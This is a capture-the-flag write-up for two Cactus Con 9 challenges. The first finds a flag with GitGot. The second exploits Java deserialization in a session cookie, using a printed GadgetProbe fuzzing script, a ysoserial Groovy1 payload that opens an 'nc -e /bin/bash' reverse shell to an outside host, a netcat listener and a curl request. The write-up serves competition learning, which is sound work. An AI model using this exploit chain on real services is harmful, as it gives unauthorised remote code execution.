# Cactus Con 9 – Missing Fox

## Challenge 1: GitGot

>  Agent Bishop, as per our discussion over the phone I am sending you the files agent Fox left on the USB thumb drive before she was kidnapped near the central park. We think she was close to uncovering the hideout of the group that was organizing large scale Phishing camps using our organization name. Download the files from here: https://drive.google.com/file/d/1haMoHnB-NiNJfshXMl7hAU_0msyAI5Iw/view?usp=sharing

> author: @Rayhan0x01

---

This is a pretty straightforward and easy challenge, more misc than web. Everything you need is provided, you just have to run it.

# Solution
After unzipping the provided archive, a `.bash_history` file is found. 

![](https://i.imgur.com/AbZnsb5.png)

 Run the same commands with your own github token from https://github.com/settings/tokens

GitGot will find https://gist.github.com/knightHound/7fccc4e66decababa249cad3ae73c8a7

![](https://i.imgur.com/OBqvmIq.png)

In the gist, this line containing the flag is found
`var firefox_0x17cf = ['f','l','a','g','{53mi_4ut0m4t3d_in_4n_4ut0m4t3d_w0r1d}']`

> flag{53mi_4ut0m4t3d_in_4n_4ut0m4t3d_w0r1d}

---

## Challenge 2: GadgetProbe
>Agent Bishop, we were able to recover one additional file that was corrupted before it could be copied fully on the USB thumb drive, it contains a web portal that we think might be related to her kidnappers! I'm sure you found something in the previous engagement that can be useful here! http://167.172.18.80:8195/

> author: @rayhan0x01

--- 
This challenge involves a java deserialization vulnerability in the session cookie. I'm surprised I had the only solve because, similar to the previous challenge, most of what you need is already directly provided.

# Solution
The provided website doesn't seem to have anything immediately useful, lets check the provided files.

In the extracted folder, there are three files. A .jar and .java file for generating serialized payloads, and a python script for fuzzing the payloads on a webserver.

![](https://i.imgur.com/Fu1zmlX.png)

Also included are three wordlists containing java classes.

The python script is currently setup to fuzz the JSESSID cookie on http://172.16.95.1:8000.
```python
import subprocess, sys, requests

banner = """

Generate GadgetProbe payloads in base64 with free dnsbin (https://requestbin.net/dns) or (http://dnsbin.zhack.ca/)
Usage: python3 GadgetSmith.py wordlist.txt XXXXX.d.requestbin.net

"""

if len(sys.argv) < 2:
	print(banner)
	sys.exit()

wordlist = sys.argv[1]

dnsbin = sys.argv[2]

get_payloads = subprocess.getoutput("java -cp '.:GadgetProbe-1.0-SNAPSHOT-all.jar' gen_payloads.java %s %s" % (wordlist,dnsbin))

payloads = [ x for x in get_payloads.split('\n') if x.startswith('rO0') ]


if not payloads:
	print("[!] Something went wrong while generating payloads!")
	sys.exit()


for payload in payloads:
	resp = requests.get("http://172.16.95.1:8000",timeout=30,headers={"Cookie": "JSESSID=%s" % payload}).text
	print(".",end="")
```

We can change the url from `http://172.16.95.1:8000` to the website given in the challenge (http://167.172.18.80:8195/).

The new website also uses `PHPSESSID`, rather than `JSESSID`, so we will change that as well.

The GadgetProbe fuzzer works by generating dns request serialized payloads, so we'll need a dns server to use. I'll use https://requestbin.net/dns.

Run the fuzzer with `python3 fuzz.py wordlists/FasterXML_blacklist.list 3a92c6f9307885c925f7.d.requestbin.net` and watch for incoming dns requests.

In our received data on requestbin, we see a dns request from the  `groovy.beans.BindableASTTransformation` class.

![](https://i.imgur.com/BOSGWW4.png)

We now know that deserialization with the `groovy.beans.BindableASTTransformation` class worked, so let's generate a base64 encoded reverse shell payload with [ysoserial](https://github.com/frohoff/ysoserial).
`java -jar /opt/ysoserial-master-6eca5bc740-1.jar Groovy1 'nc -e /bin/bash downgrade.ml 4444' | base64 -w 0 > payload.txt`

Start a netcat listener to catch the reverse shell 
`nc -lnvp 4444`

And make a request to the server with the payload as the `PHPSESSID` cookie. 
```curl -H "Cookie: PHPSESSID=`cat payload.txt`" http://167.172.18.80:8195/```

Success!

![](https://i.imgur.com/6JDFYeP.png)

We can `cat flag.txt`


![](https://i.imgur.com/Hq5gRS5.png)

> flag{got_99_problems_but_a_gadget_aint_one}
